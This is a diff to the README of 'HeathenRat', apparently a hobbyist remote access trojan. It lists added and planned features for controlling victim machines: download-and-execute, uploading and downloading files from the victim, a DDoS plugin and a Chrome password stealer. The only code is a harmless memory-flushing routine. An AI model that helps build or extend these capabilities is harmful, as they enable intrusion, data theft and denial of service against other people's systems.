@@ -21,11 +21,45 @@ YOU NEED BUNIFU , XANDERUI
 What will be added next time ?
 
 * -download file and execute (computer and memory)
-* -use File Manager to edit txt file and download file from victim
-* -...
+* -...more more and more
+* -also the stub and the code is going be optimized when the project will be ended.(Plugins will be separeted in DLL like DDOS Plugin)
 
 NOTE : Currently developing a derivative of this rat (like console) so the command center will not be often udapte in this version. Also the stub will be nearly the same in Console Rat (will release soon) and HeathenRat. Also searching for a good lib to make passwords stealer after this shitty chrome update.
 
+LAST UPDATE FROM  19-02-2020 21:32 :
+
+* -Added Upload option to file manager
+* -Added Download option to file manager
+* -Improved reconnect event (known minor bugs)
+* -Small changes with the UI
+* -Added dependencies in a folder with same name 
+* -Added SwapMouse Buttons Functions
+* -Added DoubleClic event in File Manager to go on in folders
+* -Clear Ram after using plugin 
+
+```Visual Basic 
+    ''Come from : https://www.youtube.com/watch?v=-fPY7ecWPUA
+    ''Reset Cache Memory
+    Declare Function SetProcessWorkingSetSize Lib "kernel32.dll" (ByVal process As IntPtr, ByVal minimumWorkingSetSize As Integer, ByVal maximumWorkingSetSize As Integer) As Integer
+    Public Sub FlushMemory()
+        Try
+            GC.Collect()
+            GC.WaitForPendingFinalizers()
+            If (Environment.OSVersion.Platform = PlatformID.Win32NT) Then
+                SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
+                Dim myProcesses As Process() = Process.GetProcessesByName("ApplicationName")
+                Dim myProcess As Process
+                'Dim ProcessInfo As Process
+                For Each myProcess In myProcesses
+                    SetProcessWorkingSetSize(myProcess.Handle, -1, -1)
+                Next myProcess
+            End If
+        Catch ex As Exception
+        End Try
+    End Sub
+
+    ''https://www.youtube.com/watch?v=-fPY7ecWPUA
+```
 
 
 LAST UPDATE FROM 17-02-2020 22:42 :
